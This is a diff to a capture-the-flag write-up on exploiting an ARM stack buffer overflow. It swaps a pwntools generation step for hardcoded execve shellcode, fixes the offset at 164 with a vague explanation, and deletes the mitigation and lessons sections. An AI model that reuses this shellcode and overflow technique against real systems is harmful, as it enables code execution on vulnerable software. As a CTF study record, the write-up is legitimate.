@@ -34,6 +34,8 @@ Stack Layout:
 
 **Total overflow distance**: 168 (buffer) + 1 (v7) + 4 (saved BP) = 173 bytes to reach return address
 
+but this is not the correct offset we will discouss later on
+
 ## Exploitation Strategy
 
 ### Information Leak
@@ -51,22 +53,15 @@ Since **NX is disabled**, we can execute shellcode directly on the stack. Our st
 
 ## Exploit Development
 
-### Shellcode Generation
-Using pwntools to generate ARM shellcode:
+### Shellcode
+
+we will use this shellcode
+
 ```python
-from pwn import *
-context.arch = 'arm'               # or 'arm/thumb' for Thumb
-sc = asm(shellcraft.execve("/bin/cat", ["/bin/cat", "flag.txt"]))
-print("b'" + ''.join(f'\\x{b:02x}' for b in sc) + "'")
+# Generated shellcode for execve("/bin/cat", ["/bin/cat", "flag.txt"], NULL)
+shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x2c\x35\x2a\x70\x69\x46\x4b\x60\x8a\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x00\x66\x6c\x61\x67\x2e\x74\x78\x74\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
 ```
 
-![shellcode](./img/shellcode.png)
-
-
-The generated shellcode:
-- Uses ARM Thumb mode for compact code
-- Sets up `execve("/bin/cat", ["/bin/cat", "flag.txt"], NULL)`
-- Properly handles string termination and argument arrays
 
 ### Offset Calculation
 Through testing, we determined the exact offset:
@@ -99,7 +94,7 @@ def send(p, msg):
 
 # Generated shellcode for execve("/bin/cat", ["/bin/cat", "flag.txt"], NULL)
 shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x2c\x35\x2a\x70\x69\x46\x4b\x60\x8a\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x00\x66\x6c\x61\x67\x2e\x74\x78\x74\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
-offset = 164 
+offset = 164  # Adjusted offset accounting for shellcode behavior
 
 print('[!] Shellcode length: {}'.format(len(shellcode)))
 
@@ -188,75 +183,9 @@ The shellcode uses ARM Thumb mode for efficiency:
 - **Argument Array**: Builds `argv[]` array on stack
 - **Syscall Setup**: Sets `r7=11` (execve syscall number), `svc 1` triggers syscall
 
-### Memory Corruption Details
-```
-Before Overflow:
-[168-byte buffer][v7][saved BP][return address]
-
-After Overflow:
-[SHELLCODE][PADDING][LEAKED_STACK_ADDR]
-^                                ^
-|                                |
-Shellcode placed here    Return address overwritten to point here
-```
 
 ### Why Offset is 164, Not 173
 The actual working offset was 164 bytes due to:
 - Shellcode execution requirements
 - Stack alignment considerations  
 - ARM-specific frame pointer behavior
-
-## Mitigation Strategies
-
-### Secure Coding Practices
-1. **Use Bounded Input Functions**:
-   ```c
-   // INSECURE
-   scanf(" %[^\n]s", s);
-   
-   // SECURE  
-   fgets(s, sizeof(s), stdin);
-   ```
-
-2. **Compiler Protections**:
-   ```bash
-   # Enable security features
-   gcc -fstack-protector -pie -fPIE -D_FORTIFY_SOURCE=2 binary.c
-   ```
-
-3. **System Hardening**:
-   - Enable ASLR: `echo 2 > /proc/sys/kernel/randomize_va_space`
-   - Enable NX: Compile with `-z noexecstack`
-
-## Lessons Learned
-
-### Technical Insights
-1. **ARM vs x86 Differences**: ARM uses different calling conventions and syscall methods
-2. **Thumb Mode**: ARM Thumb instruction set provides code size advantages
-3. **QEMU User-Mode**: Essential for cross-architecture exploitation testing
-4. **Stack Layout Analysis**: Understanding exact memory layout is crucial for reliable exploitation
-
-### Exploitation Principles
-1. **Information Leakage**: Even seemingly benign features (like memory dumps) can enable exploitation
-2. **Defense Evasion**: Lack of basic protections makes exploitation straightforward
-3. **Tool Proficiency**: Pwntools dramatically simplifies shellcode generation and exploitation
-4. **Testing Methodology**: Local testing with emulation is essential before remote exploitation
-
-## Conclusion
-
-This challenge demonstrates a classic stack buffer overflow vulnerability made exploitable by:
-- Lack of basic memory protections
-- Helpful information leakage
-- Executable stack memory
-
-The successful exploit combines:
-1. **Precise offset calculation** through testing
-2. **Architecture-specific shellcode** generation
-3. **Reliable address leaking** from program output
-4. **Careful payload construction** to hijack control flow
-
-**Flag Captured**: The exploit successfully reads and displays the flag, demonstrating complete code execution and privilege escalation through memory corruption.
-
----
-
-*This challenge serves as an excellent introduction to ARM exploitation and highlights the importance of basic security practices in software development.*
